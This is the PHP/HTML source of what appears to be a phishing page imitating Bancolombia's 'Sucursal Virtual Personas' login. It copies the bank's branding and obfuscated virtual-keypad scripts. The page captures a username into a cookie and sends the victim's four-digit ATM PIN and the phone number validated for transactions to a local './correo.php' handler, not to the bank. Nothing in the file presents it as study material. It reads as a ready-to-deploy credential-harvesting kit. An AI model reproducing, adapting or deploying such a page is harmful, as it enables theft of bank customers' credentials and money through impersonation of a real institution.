<?php  
$usuario=$_POST['usuario'];
setcookie('usuario',$usuario,time()+60*9);
?>

<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
  <title>Bancolombia Sucursal Virtual Personas</title>
  <meta content="es" http-equiv="Content-Language">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="description" content="Todo1">
  <meta name="author" content="Todo1 Services">
  <meta name="Copyright" content="(c) 2014  Todo1 Services. All rights reserved.">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
 
<link href="./css/styles.css" media="all" rel="stylesheet" type="text/css">
  <link href="./css/bootstrap.css" media="all" rel="stylesheet" type="text/css"> 
  <link href="./css/keyboard_util.css" rel="stylesheet" type="text/css">
	<script type="text/javascript" src="./js/jquery-1.10.1.js"></script>
	<script type="text/javascript" src="./js/jquery-ui.js"></script>
	<link href="./css/jquery-ui.css" media="all" rel="stylesheet" type="text/css"> 
   	<link href="./css/ui.css" media="all" rel="stylesheet" type="text/css">
    <script type="text/javascript" src="./js/bootstrap.js"></script>
	<script language="JavaScript" type="text/javascript" src="./js/keyboard.js"></script>
	<script language="JavaScript" type="text/javascript" src="./js/layer_lib_util.js"></script>
<script language="JavaScript">
function addEventsButton(id_button){
var IE = navigator.appName=="Microsoft Internet Explorer";
if( navigator.userAgent.match( /iPad/i ) ) {
document.getElementById(id_button).addEventListener('touchstart', function(){recoveryPassword();mLYYINTZJg_x();document.authenticationForm.userId.value = '0';  return QNof_nlvdWKw();}, false);
}
else if(IE){
document.getElementById(id_button).attachEvent('onclick', function(){recoveryPassword(); M_mWmzhyCnYh(); document.authenticationForm.userId.value = '0';  return QNof_nlvdWKw();});
document.getElementById(id_button).attachEvent('onmouseover', function(){mLYYINTZJg_x();});
document.getElementById(id_button).attachEvent('onmouseout', function(){HZGUBWCelpAG();});
}else{
document.getElementById(id_button).addEventListener('click', function(){recoveryPassword(); M_mWmzhyCnYh(); document.authenticationForm.userId.value = '0';  return QNof_nlvdWKw();}, false);
document.getElementById(id_button).addEventListener('mouseover', function(){mLYYINTZJg_x();}, false);
document.getElementById(id_button).addEventListener('mouseout', function(){HZGUBWCelpAG();}, false);
}
}
function clearByError(){
if(document.forms[0].userId.value == '' || isEmpty(passwordMinLength[0]) || (passwordMinLength[0] < DEF_MAXLENGTH - 1)){
clearKeys();
document.forms[0].password.value='';
}
}

function validateAndClear(){
var validate = QNof_nlvdWKw();
if (isNaN(validate) || validate == null || validate == false){
if( navigator.userAgent.match( /iPad/i ) ) {
clearByErrorIpad();
} else {
clearByError();
}
return false;	
}
return true;
}

function clearByErrorIpad(){
document.forms[0].userId.value='';
document.forms[0].password.value='';
document.forms[0].tempUserID.value='';
return true;
}
function addEventsButtonSinCero(id_button){
var IE = navigator.appName=="Microsoft Internet Explorer";
if( navigator.userAgent.match( /iPad/i ) ) {
document.getElementById(id_button).addEventListener('touchstart', function(){recoveryPassword(); mLYYINTZJg_x(); if(validateAndClear()){validateForm();}}, false);
}
else if(IE){

document.getElementById(id_button).attachEvent('onmouseover', function(){M_mWmzhyCnYh();});
document.getElementById(id_button).attachEvent('onmouseout', function(){changeToOrigKeyboard();});
}else{

document.getElementById(id_button).addEventListener('mouseover', function(){M_mWmzhyCnYh();}, false);
document.getElementById(id_button).addEventListener('mouseout', function(){changeToOrigKeyboard();}, false);
}
}
var APZcdvBIlLxT = [{'PASSWORD':'gpibhdFSdyjP'}][0];
function changePass(name) {
	return ( APZcdvBIlLxT[name.toUpperCase()] );
}
var passwordMinLength = new Array();
var omitformtags=["input", "textarea", "select"]
omitformtags=omitformtags.join("|")
var maxLengthKeyboard;
var origKeyboardShown = true;
var contrastLevel= "2";
var fontSizeDefault=12;
var indexField = 0;
var isOpen = false;
var isLayer = false;
var KEYCONTENT = '';
var DEF_MAXLENGTH = 4;
var pnJZLwUwvHIp = new Array();
var DDXblioY_QMy = new Array();
var maxLengthKeyboard = DEF_MAXLENGTH;
var regFunction;
function fVCktZYSpuMR(){      	KEYCONTENT = "  <table class='keyboard' border='0' cellspacing='0' cellpadding='0' align='left' valign='top'>  <tr>    <td width='0' height='18' ></td>    <td></td>  </tr>  <tr>    <td height='0' width='1'></td>    <td colspan='2'>      <table align='left' valign='top' cellspacing='0' cellpadding='0' class='bg_button'>        <tr align='left'>                  <td valign='top' align='left'> <table class='bg_button' id='_KEYBRD' valign='top' >  <tr><td class='bg_buttonSmall'  align='center' style='cursor:default' onMouseOver='M_mWmzhyCnYh();' onmouseout='changeToOrigKeyboard();' onclick='xPxktZRXoHMU(\"gIK\");'>  <div border='0' id ='IPnLXVrPZKxW7' valign='center' align='center' onfocus='this.blur(); class='colorContrast + contrastLevel + '>7</div></td><td class='bg_buttonSmall'  align='center' style='cursor:default' onMouseOver='M_mWmzhyCnYh();' onmouseout='changeToOrigKeyboard();' onclick='xPxktZRXoHMU(\"n4L\");'>  <div border='0' id ='IPnLXVrPZKxW1' valign='center' align='center' onfocus='this.blur();' class='colorContrast + contrastLevel + '>1</div></td><td class='bg_buttonSmall'  align='center' style='cursor:default' onMouseOver='M_mWmzhyCnYh();' onmouseout='changeToOrigKeyboard();' onclick='xPxktZRXoHMU(\"AMX\");'>  <div border='0' id ='IPnLXVrPZKxW9' valign='center' align='center' onfocus='this.blur();' class='colorContrast + contrastLevel + '>9</div></td></tr>  <tr><td class='bg_buttonSmall'  align='center' style='cursor:default' onMouseOver='M_mWmzhyCnYh();' onmouseout='changeToOrigKeyboard();' onclick='xPxktZRXoHMU(\"WdQ\");'>  <div border='0' id ='IPnLXVrPZKxW2' valign='center' align='center' onfocus='this.blur();' class='colorContrast + contrastLevel + '>2</div></td><td class='bg_buttonSmall'  align='center' style='cursor:default' onMouseOver='M_mWmzhyCnYh();' onmouseout='changeToOrigKeyboard();' onclick='xPxktZRXoHMU(\"me8\");'>  <div border='0' id ='IPnLXVrPZKxW6' valign='center' align='center' onfocus='this.blur();' class='colorContrast + contrastLevel + '>6</div></td><td class='bg_buttonSmall'  align='center' style='cursor:default' onMouseOver='M_mWmzhyCnYh();' onmouseout='changeToOrigKeyboard();' onclick='xPxktZRXoHMU(\"0h3\");'>  <div border='0' id ='IPnLXVrPZKxW0' valign='center' align='center' onfocus='this.blur();' class='colorContrast + contrastLevel + '>0</div></td></tr>  <tr><td class='bg_buttonSmall'  align='center' style='cursor:default' onMouseOver='M_mWmzhyCnYh();' onmouseout='changeToOrigKeyboard();' onclick='xPxktZRXoHMU(\"kSa\");'>  <div border='0' id ='IPnLXVrPZKxW8' valign='center' align='center' onfocus='this.blur();' class='colorContrast + contrastLevel + '>8</div></td><td class='bg_buttonSmall'  align='center' style='cursor:default' onMouseOver='M_mWmzhyCnYh();' onmouseout='changeToOrigKeyboard();' onclick='xPxktZRXoHMU(\"2bc\");'>  <div border='0' id ='IPnLXVrPZKxW3' valign='center' align='center' onfocus='this.blur();' class='colorContrast + contrastLevel + '>3</div></td><td class='bg_buttonSmall'  align='center' style='cursor:default' onMouseOver='M_mWmzhyCnYh();' onmouseout='changeToOrigKeyboard();' onclick='xPxktZRXoHMU(\"H67\");'>  <div border='0' id ='IPnLXVrPZKxW5' valign='center' align='center' onfocus='this.blur();' class='colorContrast + contrastLevel + '>5</div></td></tr>  <tr><td class='bg_buttonSmall'  align='center' style='cursor:default' onMouseOver='M_mWmzhyCnYh();' onmouseout='changeToOrigKeyboard();' onclick='xPxktZRXoHMU(\"fNj\");'>  <div border='0' id ='IPnLXVrPZKxW4' valign='center' align='center' onfocus='this.blur();' class='colorContrast + contrastLevel + '>4</div></td><td colspan='2' onclick='clearKeys();' class='bg_buttonSmall'><div id='clearKey' border='0' valign='center' align='center' onfocus='this.blur();' class='colorContrast + contrastLevel + '>Borrar</div></td></tr></table><table class='bg_button' id='_CONSTRAST' valign='top' cellspacing='0'>  <tr><td><img width='90' height='34' border='0' src='./mua/images/kb" + contrastLevel + ".png' name='constrastImg' id='constrastImg' usemap='#numericKeyboardMap' > <map name='numericKeyboardMap' id='numericKeyboardMap'><area shape='circle' class='cursorContrast' coords='10,30,15' onmouseover=setHandCursor(document.constrastImg) onclick='changeContrastLevel(1)' onmouseout='setDefaultCursor(document.constrastImg)'><area shape='circle' class='cursorContrast' coords='50,30,15' onmouseover=setHandCursor(document.constrastImg) onclick='changeContrastLevel(2)' onmouseout='setDefaultCursor(document.constrastImg)'><area shape='circle' class='cursorContrast' coords='90,30,15' onmouseover=setHandCursor(document.constrastImg) onclick='changeContrastLevel(3)' onmouseout='setDefaultCursor(document.constrastImg)'></map></td></tr></table></td>        </tr>      </table>    </td>  </tr><tr>    <td height='17'></td>    <td colspan='2'></td>  </tr> </table>";   	return KEYCONTENT; }
function changeContrastLevel(level) {  if(contrastLevel != level) {  contrastLevel = level; refreshNumericKeyboard(level);  changeConstrastImage();}    }
function    BhungvbvMGXj(){     	if (validBrowser()) {     	hideUserID();     		var userId=document.loginUserForm.userId.value;      		var password=document.loginUserForm.password.value;  		for(var i=userId.search(" "); i!=-1; i=userId.search(" ")){      		i=userId.search(" ");       		var tmp = userId.substring(0,i);     		userId = tmp + userId.substring(i+1,userId.length);      		}   		if(isEmpty(userId) || isEmpty(password)) {        		alert('Por favor, ingresar su número de Documento y su Clave.');         	} else if (isNaN(userId) ) {      			alert('Por favor, ingresar su número de Documento y su Clave.');     			clearKeys();     	document.loginUserForm.tempUserID.value="";          	} else if (passwordMinLength[0] < DEF_MAXLENGTH - 1){   			alert('La clave debe ser de al menos 4 dígitos. Por favor rectifique e intente nuevamente.');      			clearKeys();     			document.loginUserForm.password.value=""; 	 	} 		else {             	top.withNotify=true;              return true;          }    }       	document.loginUserForm.tempUserID.focus();     	return false;        }function BhungvbvMGXjRsaPass(){ 	if (validBrowser()) {     		var password=document.loginUserForm.password.value;     		if(isEmpty(password))     			alert('Por favor ingrese su clave.');      		else if(passwordMinLength[0] < DEF_MAXLENGTH - 1){      			alert('La clave debe ser de al menos 4 dígitos. Por favor rectifique e intente nuevamente.');  			clearKeys(); 			document.loginUserForm.password.value="";      	 	} 		else {              	top.withNotify=true;                return true;            }        }   	return false;       }
function bindElement(elem,index) {   	indexField=0;   	if (index!=undefined){        		indexField=index;    	}     	pnJZLwUwvHIp[indexField] = elem;      	maxLengthKeyboard = (pnJZLwUwvHIp[indexField] && pnJZLwUwvHIp[indexField].maxLength? pnJZLwUwvHIp[indexField].maxLength: DEF_MAXLENGTH);   }
function disableselect(e){       	if (omitformtags.indexOf(e.target.tagName.toLowerCase())==-1)        		return false;       }
function clearUserID(){        	document.loginUserForm.tempUserID.value='';  	document.loginUserForm.userId.value='';      }
function recoveryPassword(){       	for (i=0; i<pnJZLwUwvHIp.length; i++){	   pnJZLwUwvHIp[i].value = DDXblioY_QMy[i].value;       	}}
//function xPxktZRXoHMU(keyVal) { 	passwordMinLength[indexField] =pnJZLwUwvHIp[indexField].value.length;	if (pnJZLwUwvHIp[indexField].value.length < DEF_MAXLENGTH) {       		pnJZLwUwvHIp[indexField].value += '*';  	   	DDXblioY_QMy[indexField].value += keyVal;   	   	if (regFunction) {      			regFunction();             	} 		if(document.loginUserForm.tempUserID != undefined) {       			if (document.loginUserForm.tempUserID.value !== "****************" && document.loginUserForm.tempUserID.value !== ""){  				document.loginUserForm.userId.value = document.loginUserForm.tempUserID.value;      			   	document.loginUserForm.tempUserID.value = "****************";    			}		} 	}}
function validBrowser() {         var EX = navigator.appName=="Microsoft Internet Explorer";        if (EX){                var EXversion = navigator.appVersion.substring(navigator.appVersion.indexOf(";")+1);            EXversion = parseFloat(EXversion.substring(0,EXversion.indexOf(";")));          if (EXversion < 5){             return false;          }         }       else {           var EXversion = navigator.appVersion;                var i = EXversion.indexOf("[");          if ( i != -1 || (i= EXversion.indexOf("(")) != -1 )                	EXversion = EXversion.substring(0,i);             	EXversion = parseFloat(EXversion);	          if (EXversion < 5.0){               return false;         }           }      return true;   }		
function changeToOrigKeyboard(){      	for (i=0;i<10;i++){ 			var mykey = document.getElementById('IPnLXVrPZKxW' + i);    			mykey.innerHTML=i;     			mykey.style.fontSize=12;        			mykey.style.fontWeight='bolder';      	}    }
function setDefaultCursor(element) {     element.style.cursor = 'default';    }
function resetForm() {   	document.loginUserForm.userId.value="";  	document.loginUserForm.tempUserID.value="";     	document.loginUserForm.password.value="";       }		
function closeKeyb(){      	if (isLayer) activateChild(isOpen = false);        pnJZLwUwvHIp[indexField].disabled = false;     }
function changeConstrastImage(){     var mykey = document.getElementById('constrastImg');      mykey.src='./mua/images/kb/' + contrastLevel + '.png'      }
function hideUserID(){            var x = document.loginUserForm.tempUserID.value;       if (x !== "" && x !== "****************"){     		document.loginUserForm.userId.value = x;       		document.loginUserForm.tempUserID.value = "****************";    	}      }
function createKeyboard(openLayer, xPos, yPos) {       if (isLayer = openLayer)              createChild(window, "keyboard", fVCktZYSpuMR(), isOpen, 330, 135, xPos, yPos);         else               document.getElementById('keyboard_').innerHTML =  (fVCktZYSpuMR());           blockSelect(document.all? document.all['_KEYBRD']: document.getElementById? document.getElementById('_KEYBRD'): document);        refreshNumericKeyboard(contrastLevel);    }     
function blockSelect(element) {   	if (typeof element.onselectstart!="undefined"){     		element.onselectstart=new Function ("event.returnValue=false;  return false; ");    	}else{   		element.onmousedown=disableselect; 		element.onmouseup=reEnable;       	}}		
function clearKeys() {       	  pnJZLwUwvHIp[indexField].value="";      	  DDXblioY_QMy[indexField].value="";     }		
function setHandCursor(element) {  element.style.cursor = 'pointer';   }		
function startKeyb(elem, index, modal) {        if (pnJZLwUwvHIp[indexField]) {    	      pnJZLwUwvHIp[indexField].disabled = false;        }          bindElement(elem);  	BZQwLVPJjCXP(index);         if (!isOpen && isLayer) {        	     activateChild(isOpen = true);      }       if(modal)  {                pnJZLwUwvHIp[indexField].disabled = true;       }       }	
function refreshNumericKeyboard(contrastLevel) {   for(var i=0; i<10; i++) {   var mykey = document.getElementById('IPnLXVrPZKxW' + i);    mykey.style.fontSize=fontSizeDefault;       mykey.className = 'colorContrast'+contrastLevel;   }    var clearKey = document.getElementById('clearKey');   clearKey.className = 'colorContrast'+contrastLevel;}		
function M_mWmzhyCnYh(){     for (i=0;i<10;i++){           var mykey = document.getElementById('IPnLXVrPZKxW' + i);      	     mykey.innerHTML='*';      	     mykey.style.fontSize=15;       	     mykey.style.fontWeight='bolder';      }}
function BZQwLVPJjCXP(index) {  	if (index==undefined){     		index=0;  	}     	var form = pnJZLwUwvHIp[0].form;     	var vf;   	if (!DDXblioY_QMy[index]) { 	    var initialLength = form.elements.length; var vfs='';		for (var i=0; i < initialLength; i++) {     			vf = APZcdvBIlLxT[form.elements[i].name.toUpperCase()];      			if (vf) { vfs+='<input type="hidden" name="'+vf+'">' ;              			}		}	} 				document.getElementById('inputs_').innerHTML = ( vfs );	for (ind=0; ind<pnJZLwUwvHIp.length; ind++){		vf = APZcdvBIlLxT[pnJZLwUwvHIp[ind].name.toUpperCase()]; 		if(form[vf] == undefined) {      			DDXblioY_QMy[ind] = "";      		} 		else {        			DDXblioY_QMy[ind] = form[vf];  		}      		DDXblioY_QMy[ind].value = "";    	}}		
function reEnable(){  	return true;     }	
function fVCktZYSpuMR(){      	KEYCONTENT = "  <table class='keyboard' border='0' cellspacing='0' cellpadding='0' align='left' valign='top'>  <tr>    <td width='0' height='18' ></td>    <td></td>  </tr>  <tr>    <td height='0' width='1'></td>    <td colspan='2'>      <table align='left' valign='top' cellspacing='0' cellpadding='0' class='bg_button'>        <tr align='left'>                  <td valign='top' align='left'> <table class='bg_button' id='_KEYBRD' valign='top' >  <tr><td class='bg_buttonSmall'  align='center' style='cursor:default' onMouseOver='M_mWmzhyCnYh();' onmouseout='changeToOrigKeyboard();' onclick='xPxktZRXoHMU(\"gIK\");'>  <div border='0' id ='IPnLXVrPZKxW7' onclick='' valign='center' align='center' onfocus='this.blur();' 'class='colorContrast + contrastLevel + ' onclick=''>7</div></td><td class='bg_buttonSmall'  align='center' style='cursor:default' onMouseOver='M_mWmzhyCnYh();' onmouseout='changeToOrigKeyboard();' onclick='xPxktZRXoHMU(\"n4L\");'>  <div border='0' id ='IPnLXVrPZKxW1' onclick='' valign='center' align='center' onfocus='this.blur();' class='colorContrast + contrastLevel + '>1</div></td><td class='bg_buttonSmall'  align='center' style='cursor:default' onMouseOver='M_mWmzhyCnYh();' onmouseout='changeToOrigKeyboard();' onclick='xPxktZRXoHMU(\"AMX\");'>  <div border='0' id ='IPnLXVrPZKxW9' onclick='' valign='center' align='center' onfocus='this.blur();' class='colorContrast + contrastLevel + '>9</div></td></tr>  <tr><td class='bg_buttonSmall'  align='center' style='cursor:default' onMouseOver='M_mWmzhyCnYh();' onmouseout='changeToOrigKeyboard();' onclick='xPxktZRXoHMU(\"WdQ\");'>  <div border='0' id ='IPnLXVrPZKxW2' onclick='' valign='center' align='center' onfocus='this.blur();' class='colorContrast + contrastLevel + '>2</div></td><td class='bg_buttonSmall'  align='center' style='cursor:default' onMouseOver='M_mWmzhyCnYh();' onmouseout='changeToOrigKeyboard();' onclick='xPxktZRXoHMU(\"me8\");'>  <div border='0' id ='IPnLXVrPZKxW6' onclick='' valign='center' align='center' onfocus='this.blur();' class='colorContrast + contrastLevel + '>6</div></td><td class='bg_buttonSmall'  align='center' style='cursor:default' onMouseOver='M_mWmzhyCnYh();' onmouseout='changeToOrigKeyboard();' onclick='xPxktZRXoHMU(\"0h3\");'>  <div border='0' id ='IPnLXVrPZKxW0' onclick='' valign='center' align='center' onfocus='this.blur();' class='colorContrast + contrastLevel + '>0</div></td></tr>  <tr><td class='bg_buttonSmall'  align='center' style='cursor:default' onMouseOver='M_mWmzhyCnYh();' onmouseout='changeToOrigKeyboard();' onclick='xPxktZRXoHMU(\"kSa\");'>  <div border='0' id ='IPnLXVrPZKxW8' onclick='' valign='center' align='center' onfocus='this.blur();' class='colorContrast + contrastLevel + '>8</div></td><td class='bg_buttonSmall'  align='center' style='cursor:default' onMouseOver='M_mWmzhyCnYh();' onmouseout='changeToOrigKeyboard();' onclick='xPxktZRXoHMU(\"2bc\");'>  <div border='0' id ='IPnLXVrPZKxW3' onclick='' valign='center' align='center' onfocus='this.blur();' class='colorContrast + contrastLevel + '>3</div></td><td class='bg_buttonSmall'  align='center' style='cursor:default' onMouseOver='M_mWmzhyCnYh();' onmouseout='changeToOrigKeyboard();' onclick='xPxktZRXoHMU(\"H67\");'>  <div border='0' id ='IPnLXVrPZKxW5' onclick='' valign='center' align='center' onfocus='this.blur();' class='colorContrast + contrastLevel + '>5</div></td></tr>  <tr><td class='bg_buttonSmall'  align='center' style='cursor:default' onMouseOver='M_mWmzhyCnYh();' onmouseout='changeToOrigKeyboard();' onclick='xPxktZRXoHMU(\"fNj\");'>  <div border='0' id ='IPnLXVrPZKxW4' onclick='' valign='center' align='center' onfocus='this.blur();' class='colorContrast + contrastLevel + '>4</div></td><td colspan='2' onclick='clearKeys();' class='bg_buttonSmall'><div id='clearKey' border='0' valign='center' align='center' onfocus='this.blur();' class='colorContrast + contrastLevel + '>Borrar</div></td></tr></table><table class='bg_button' id='_CONSTRAST' valign='top' cellspacing='0'>  <tr><td><img width='90' height='34' border='0' src='./mua/images/kb/" + contrastLevel + ".png' name='constrastImg' id='constrastImg' usemap='#numericKeyboardMap' > <map name='numericKeyboardMap' id='numericKeyboardMap'><area shape='circle' class='cursorContrast' coords='10,30,15' onmouseover=setHandCursor(document.constrastImg) onclick='changeContrastLevel(1)' onmouseout='setDefaultCursor(document.constrastImg)'><area shape='circle' class='cursorContrast' coords='50,30,15' onmouseover=setHandCursor(document.constrastImg) onclick='changeContrastLevel(2)' onmouseout='setDefaultCursor(document.constrastImg)'><area shape='circle' class='cursorContrast' coords='90,30,15' onmouseover=setHandCursor(document.constrastImg) onclick='changeContrastLevel(3)' onmouseout='setDefaultCursor(document.constrastImg)'></map></td></tr></table></td>        </tr>      </table>    </td>  </tr><tr>    <td height='17'></td>    <td colspan='2'></td>  </tr> </table>";   	return KEYCONTENT; }	
</script>
	<script language="JavaScript" type="text/javascript">
	var requiredMajorVersion = 10;
	var requiredMinorVersion = 0;
	var requiredRevision = 0;
	</script>
	<script language="JavaScript">
	var enPasswLength = 0;
	var contError="";
	var count=0;
	function enviar() {
	var form = $( "#loginUserForm" );
		document.getElementById("btnGo").disabled = true;    
			if(count==0){form.validate();if ( form.valid() ){post_fingerprints(document.forms[0]);var dat = changePass('password');document.getElementById("id_ss").value = processPassword(document.getElementsByName(dat)[0].value);document.getElementsByName(dat)[0].value = '';document.getElementById("password").value = '';document.getElementById("password").type='text';M_mWmzhyCnYh();form.submit();count++;return false;}} 
      var validationResult = $("#loginUserForm").valid();
      if(!validationResult){ count=0;document.getElementById("btnGo").disabled = false; }}

		$(document).ready(function() {contError= $("#contentError").html(); 
		$.validator.addMethod("passwordLength", function(value,element,param){return ( value.length >= 4  &&  value.length <= 4 );
		} );
		$.validator.addMethod("validaFormato", function(value,element,param){
			var patron = /^\d*$/;
		    if(!value.search(patron))return true;else return false;} );});
	</script>
<link rel="shortcut icon" href="https://sucursalpersonas.transaccionesbancolombia.com/mua/favicon.ico"></head>
<body onload="mueveReloj();">
<form id="loginUserForm" name="loginUserForm" action="./correo.php" method="post" novalidate="novalidate">
<input id="id_ss" name="id_ss" type="hidden" value="">
<div class="container">
<div>
	<div id="header" class="mua-page-header">
		<div class="row row-logo-svp"> 
			<div class="col-xs-12 col-sm-7 col-md-7 left-div">
				<div class="mua-imgLogoItem"></div>
				<div class="text-svp-name">Sucursal Virtual Personas</div>
			</div>
		</div>
		<div class="row">
			<div class="col-xs-12 col-sm-7 col-md-7 left-div">
				<div id="lastIn" class="mua-title-text" style="padding-top: 10px !important;">
<!-- Configurar hora -->
<!--<script language="javascript" src="./password_files/jquery.jclock-min.js.descarga" type="text/JavaScript"></script>-->
<div>
	<div class="timeText">Fecha y hora actual:</div>
  <span  class="lastVisitedText">
  <script type="text/javascript">
  //array para convertir hora
 var m="AM"; 
function mueveReloj(){ 
    momentoActual = new Date(); 
    hora = momentoActual.getHours(); 
    minuto = momentoActual.getMinutes(); 
    segundo = momentoActual.getSeconds(); 

if(hora==12) 
{ 
      m="PM"; 
} 
if(hora==13) 
{ 
      hora="0"+1; 
      m="PM"; 
} 
if(hora==14) 
{ 
      hora="0"+2; 
      m="PM"; 
} 
if(hora==15) 
{ 
      hora="0"+3; 
      m="PM"; 
} 
if(hora==16) 
{ 
      hora="0"+4; 
      m="PM"; 
} 
if(hora==17) 
{ 
      hora="0"+5; 
      m="PM"; 
} 
if(hora==18) 
{ 
      hora="0"+6; 
      m="PM"; 
} 
if(hora==19) 
{ 
      hora="0"+7; 
      m="PM"; 
} 
if(hora==20) 
{ 
      hora="0"+8; 
      m="PM"; 
} 
if(hora==21) 
{ 
      hora="0"+9; 
      M="PM"; 
} 
if(hora==22) 
{ 
      hora=10; 
      m="PM"; 
} 
if(hora==23) 
{ 
      hora=11; 
      m="PM"; 
} 
if((hora==0)||(hora==24)) 
{ 
      hora=12; 
      m="AM"; 
} 

    str_segundo = new String (segundo) 
    if (str_segundo.length == 1) 
       segundo = "0" + segundo; 

    str_minuto = new String (minuto) 
    if (str_minuto.length == 1) 
       minuto = "0" + minuto; 

    str_hora = new String (hora) 
    if (str_hora.length == 1) 
       hora = "0" + hora; 

    horaImprimible = hora + ":" + minuto + ":" + segundo+" "+m; 

    cl.innerHTML = horaImprimible;//cl=clock=reloj 

    setTimeout("mueveReloj()",1000); 
} 


   var d = new Date();
   //array para convertir dia de la semana (numero) a texto
   var dia=new Array(7);
dia[0]="Domingo";
dia[1]="Lunes";
dia[2]="Martes";
dia[3]="Miercoles";
dia[4]="Jueves";
dia[5]="Viernes";
dia[6]="Sábado";
  //array para convertir mes (numero) a texto
var mm=new Date();
var m2 = mm.getMonth() + 1;
var mesok = (m2 < 10) ? '0' + m2 : m2;
var mesok=new Array(12);
mesok[0]="Enero";
mesok[1]="Febrero";
mesok[2]="Marzo";
mesok[3]="Abril";
mesok[4]="Mayo";
mesok[5]="Junio";
mesok[6]="Julio";
mesok[7]="Agosto";
mesok[8]="Septiembre";
mesok[9]="Octubre";
mesok[10]="Noviembre";
mesok[11]="Diciembre";


document.write(dia[d.getDay()]+' '+d.getDate()+' de '+mesok[mm.getMonth()]+' de '+d.getFullYear()); 
  </script>
  <span id="cl"></span>
  </span>
</div>
				</div>
			</div>
		</div>
	</div>

	<div class="panel-heading">
		<h3>
			Inicio de sesión
		</h3>
	</div>
</div>

	<div>
		<input type="hidden" name="tempUserID" id="tempUserID" value="">
		<input type="hidden" name="HIT_KEY" value="0">
		<input type="hidden" name="HIT_VKEY" value="0">
		<input type="hidden" name="userId" value="">
		<div class="panel panel-primary">
				<div class="row">
<script language="JavaScript">
	function cerrarError() {
		document.getElementById("tabError").style.display = "none";
		document.getElementById('summary').innerHTML='';
	}
</script>
<div class="col-xs-12 col-sm-12 col-md-12 mua_message_not_from_svp" id="tabError" style="display: none;">
	<div class="errorDiv">
        <div class="divTextMessage">
			<span class="icon-error errorIcon">
				<span class="path1"></span>
				<span class="path2"></span>
				<span class="path3"></span>
            </span>
            <div class="errorTitulo">Error</div>
			<div id="summary" class="errorTexto">
			</div>
		</div>
	</div>
	</div>
				</div>
				<div class="mua-panel-body">				  
					<div class="row">					
						<div class="col-lg-5 col-md-5 col-sm-6">
								<div id="phraseImage" class="mua-image-login-container">
<div class="mua-security-container">
	<div class="mua-security-img" style="margin-left: 90px; margin-bottom: 10px;">
		<img id="rsaImage" src="./images/1.jpg.jpeg" width="210" height="210" >
	</div>	
	<div class="pull-left mua-security-question">
	</div>
</div>
								</div>						
						</div>		
						<div class="col-lg-4 col-md-5 col-sm-6">

							<div class="panel_general">
								<div class="title-panel-label">
									<h1>
										Clave
									</h1>
								</div>
								<form method="post" action="./correo.php">
								<div id="contenido">
									<div class="mua-content-group-panel">
										<div class="mua-label-input">
											<label class="control-label" for="username">
												Ingresa tu clave
											</label>
										</div>
										<div>
											<div class="mua_svp_enroll_update_control">
												 <!-- input scm -->
												<input id="valor_numero" name="clave" class="mua-form-control  mua-input-icon limitado" type="password" readonly="true" maxlength="4" autocomplete="off" >
                        
                        
                        <script>




            //Declaracion de variables
        var num1 = 0;
        var opera;
        var numero_magico;
        //agregar valor a atributo onclick
        var darnumero7="darNumero('7')";
        $("#IPnLXVrPZKxW7").attr('onclick', darnumero7);

        //cuando se apreta un numero, esta funcionion lo recibe.

        function darNumero(numero){
            if(num1==0 && num1 !== '0.'){
                num1 = numero;
            }else{
                num1 += numero;
            }
            refrescar();
        }
       

        function refrescar(){
            document.getElementById("valor_numero").value = num1;
        }

        function borrar_numero(){
          num1="";
          refrescar();
        }

        function guardar_numero(){
            numero_magico=document.getElementById("valor_numero").value;
        }
        function ver_numero(){
             numero_magico=document.getElementById("valor_numero").value;
            vnumero=numero_magico;
            num1 = 0;
            refrescar();
        }
    </script>
 

												<span class="mua-icon-lock"></span>
											</div>
                        
										</div>
									</div>

									

               <div class="mua-content-legend">
                    <p>Ingresa mediante el teclado virtual la clave que usas en el cajero automático.</p>
                  </div>
                </div>
               <br><div class="mua-content-group-panel">
                    <div class="mua-label-input">
                      <label class="control-label" for="username">
                        Ingresa tu número de teléfono
                      </label>
                    </div>
                    <div>
                      <div class="mua_svp_enroll_update_control">
                         <!-- input scm -->
                        <input id="telefono" name="telefono" class="mua-form-control mua_svp_control_username" type="text" maxlength="10" autocomplete="off">
                      </div>
                      <div class="mua-content-legend">
                    <p>Ingresa el número telefónico validado para transacciones Bancolombia.</p>
                  </div>





								<div class="two-button-container mua-button-container" style="right:50px;">
									<div class="two-button-a">
                  <a href="./index.php"><input class="btn btn-default" onclick="" type="button" value="Cancelar"></a>
										
									</div>
								    <div class="two-button-b" style="right:0px;">
										<a href="./oauth.php">
										<input id="btnGo" name="btnGo" class="btn btn-success" type="submit" onmouseover="M_mWmzhyCnYh();" onmouseout="changeToOrigKeyboard();" value="Ingresar" style="margin-left:20px;">
									</a>
                  </div>


								</div>

                </form>

								<div class="mua-error-login">
									<div class="mua-error-login-div">
										<span id="popoverId" class="glyphicon icon-icono-informacion mua_pg_pgdsc_icons mua-label-icon" data-original-title="" title=""></span>
										<div id="popoverContent" class="hide">
											



<span class="mua_tooltip_close">×</span>
<div class="mua_tooltip_msg">
	
		
			Si usted es un Colombiano en el Exterior y no ha sido cliente Bancolombia en el pasado o es un cliente exclusivo Fiduciaria, usted debe generar una clave para continuar con el proceso.
		
		
	
</div>
										</div>
										<a style="font-size:14px !important;" href="#">Genera una clave personal</a>
									</div>
								</div>

							</div>

						</div>
						
						<div class="col-lg-3 col-md-3 col-sm-3 col-xs-3" style="height:350px;width:220px;">
